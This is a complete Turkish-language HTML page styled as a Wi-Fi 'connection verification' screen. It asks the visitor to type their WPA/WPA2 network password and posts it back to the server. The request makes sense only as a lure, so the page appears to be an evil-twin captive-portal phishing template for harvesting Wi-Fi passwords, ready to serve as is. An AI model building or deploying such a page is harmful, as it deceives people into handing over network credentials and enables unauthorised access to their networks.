<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Bağlantı Doğrulama</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 360px;
            text-align: center;
        }
        .wifi-icon {
            width: 60px;
            height: 60px;
            background: #2a5298;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 28px;
        }
        h2 {
            margin: 0 0 10px;
            font-size: 20px;
            color: #333;
        }
        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #2a5298;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
        }
        button:hover {
            background: #1e3c72;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="wifi-icon">📶</div>
        <h2>Wi-Fi Ağında Oturum Açın</h2>
        <p>İnternete erişmek için lütfen WPA/WPA2 şifrenizi girin.</p>
        <form action="/" method="post">
            <input type="password" name="wifi_sifre" placeholder="Wi-Fi Şifresi" required>
            <button type="submit">Bağlan</button>
        </form>
    </div>
</body>
</html>
